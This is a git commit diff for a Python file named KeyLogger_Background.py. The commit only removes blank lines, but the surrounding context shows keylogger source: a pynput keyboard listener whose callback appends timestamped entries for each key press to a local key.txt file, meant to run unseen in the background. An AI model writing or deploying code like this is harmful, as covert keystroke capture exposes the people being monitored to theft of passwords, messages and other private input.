6bf3539e0c35f7dd33f4f6536aee643b18f4820b
D34D_FR13ND5 <47918260+ptfn@users.noreply.github.com>
2020-08-02 15:48:32 +0700

    Update KeyLogger_Background.py

--- KeyLogger_Background.py
+++ KeyLogger_Background.py
@@ -1,7 +1,6 @@
 from pynput import keyboard
 import datetime
 
-
 def key_press(key):
 
     file_key = open("key.txt", 'a+', encoding='utf-8')
@@ -9,7 +8,6 @@ def key_press(key):
     file_key.write(
         str(' | Data: {} ;\n'.format(datetime.datetime.now(tz=None))))
     file_key.close()
-
 
 with keyboard.Listener(on_press=key_press) as listen:
     listen.join()
